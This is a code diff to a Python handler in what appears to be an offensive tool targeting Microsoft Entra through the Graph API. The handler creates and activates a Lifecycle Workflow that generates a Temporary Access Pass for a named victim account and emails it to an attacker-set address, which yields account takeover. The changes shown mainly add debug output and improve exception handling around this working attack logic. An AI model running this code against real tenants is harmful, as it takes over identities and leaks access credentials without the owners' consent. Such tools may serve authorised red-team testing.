@@ -3,6 +3,7 @@ from attacks.handlers.base_handler import AttackHandler, Request, Response
 from utils import logger
 import requests
 import random, string
+import json as js
 
 logger = logger.createLogger('attacks.handlers.lifecycle_pass_handler')
 
@@ -27,11 +28,12 @@ class Lifecycle_Handler(AttackHandler):
                 message_obj = {"category":"joiner","displayName":"PermissionPanic " + displayname,"description":"Configure Post-Onboarding PermissionPanic","tasks":[{"arguments":[{"name":"tapLifetimeMinutes","value":"60"},{"name":"tapIsUsableOnce","value":"false"},{"name":"cc","value":conf["userCC"]}],"description":"Generate Temporary Access Pass and send via email to user's manager and more user","displayName":"Generate TAP and Send Email"+displayname,"isEnabled":"true","continueOnError":"false","taskDefinitionId":"1b555e50-7f65-41d5-b514-5894a026d10d","category":"joiner"}],"executionConditions":{"@odata.type":"#microsoft.graph.identityGovernance.triggerAndScopeBasedConditions","scope":{"@odata.type":"microsoft.graph.identityGovernance.ruleBasedSubjectSet","rule":"(department eq 'Marketing')"},"trigger":{"@odata.type":"#microsoft.graph.identityGovernance.timeBasedAttributeTrigger","offsetInDays":7,"timeBasedAttribute":"createdDateTime"}},"isEnabled":"true","isSchedulingEnabled":"false"}
 
                 result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
-                
                 json = result.json()
-                id = json["id"]
-
+                
+                print(js.dumps(json))
+                
                 if result.status_code == 201:
+                    id = json["id"]
                     create_message_URL = "https://graph.microsoft.com/v1.0/identityGovernance/lifecycleWorkflows/workflows/" + id + "/activate"
                     message_obj = {"subjects":[{"id":conf["victim"]}]}
                     result = requests.post(create_message_URL, json=message_obj, headers=request.request_headers)
@@ -41,13 +43,10 @@ class Lifecycle_Handler(AttackHandler):
                         message += "set up a tap! on %s sent to %s  \n" % (conf["victim"], conf["userCC"])
                         status = True
                         
-
-                    
                 if message == "":
                     message = error
-            except:
-                
-                logger.error("Unexpected exception in lifecycle_pass_handler function")
+            except Exception as e:
+                logger.error(f"Unexpected exception in lifecycle_pass_handler function: {e}")
 
             
             responses.append(Response(attack_name,request.tenantId,request.appId,status,message))
